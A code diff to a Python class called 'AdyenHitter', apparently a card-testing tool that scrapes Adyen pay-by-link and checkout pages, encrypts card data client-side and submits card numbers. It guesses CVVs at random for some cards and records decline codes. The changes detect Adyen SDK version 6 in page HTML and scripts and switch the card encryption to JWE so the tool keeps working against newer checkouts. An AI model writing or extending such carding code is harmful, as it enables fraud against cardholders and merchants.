@@ -394,6 +394,12 @@ class AdyenHitter:
                 out['is_pbl']   = True
                 out['linkId']   = link_id
                 out['pbl_base'] = base
+                
+                # Check for JWE indicators in configuration (Adyen SDK version >= 6.0.0 or explicitly declared)
+                out['use_jwe'] = False
+                for script in d.get('theme', {}).values():
+                    if isinstance(script, str) and ('6.' in script or 'v6' in script):
+                        out['use_jwe'] = True
         except Exception as e:
             out['error'] = f"PBL setup error: {str(e)[:80]}"
         return out
@@ -407,7 +413,7 @@ class AdyenHitter:
         merchant = "Adyen Merchant"
         cfg = dict(clientKey=None, sessionId=None, sessionData=None,
                    publicKey=None, environment=None, adyen=False,
-                   linkId=None, loadingContext=None)
+                   linkId=None, loadingContext=None, use_jwe=False)
 
         # Check if direct adyen.link URL
         if 'adyen.link/' in self.url:
@@ -425,6 +431,11 @@ class AdyenHitter:
                     merchant = raw_title.split(' - ', 1)[1].strip()[:30]
                 else:
                     merchant = raw_title.split('|')[0].split(' - ')[0].strip()[:30]
+            
+            # Check for version indicators in HTML (like script URLs containing SDK v6)
+            if 'sdk/6.' in html or 'adyen-web/6.' in html or 'adyen.web/6.' in html:
+                cfg['use_jwe'] = True
+                
             page_cfg = _extract_config(html)
             _merge(cfg, page_cfg)
 
@@ -443,7 +454,7 @@ class AdyenHitter:
                 if pbl.get('amount_value') is not None:
                     cfg['amount_value']    = pbl['amount_value']
                     cfg['amount_currency'] = pbl.get('amount_currency', 'USD')
-                for pk in ('is_pbl', 'pbl_base', 'pbl_status', 'checkoutAttemptId'):
+                for pk in ('is_pbl', 'pbl_base', 'pbl_status', 'checkoutAttemptId', 'use_jwe'):
                     if pbl.get(pk):
                         cfg[pk] = pbl[pk]
 
@@ -455,6 +466,9 @@ class AdyenHitter:
                     try:
                         async with session.get(js, headers=hdr, timeout=8) as jr:
                             jt = jr.text() if callable(jr.text) else jr.text
+                            # Detect version v6 in JS filenames or code content
+                            if '6.' in js or 'sdk/6.' in jt or 'adyen-web/6.' in jt:
+                                cfg['use_jwe'] = True
                             _merge(cfg, _extract_config(jt))
                     except Exception:
                         continue
@@ -1012,7 +1026,7 @@ class AdyenHitter:
                         cvv = f"{random.randint(1000, 9999):04d}" if str(card['card']).startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
                         card['cvv'] = cvv
                     enc = cse.encrypt_card(
-                        card['card'], card['month'], card['year'], cvv)
+                        card['card'], card['month'], card['year'], cvv, use_jwe=cfg.get('use_jwe', False))
                 except Exception as e:
                     result['error'] = f"CSE failed: {e}"
                     result['decline_code'] = 'cse_error'
@@ -1126,7 +1140,7 @@ class AdyenHitter:
                 try:
                     cse = AdyenCSE(pk)
                     enc = cse.encrypt_card(
-                        card['card'], card['month'], card['year'], card['cvv'])
+                        card['card'], card['month'], card['year'], card['cvv'], use_jwe=cfg.get('use_jwe', False))
                 except Exception as e:
                     result['error'] = f"CSE failed: {e}"
                     result['decline_code'] = 'cse_error'
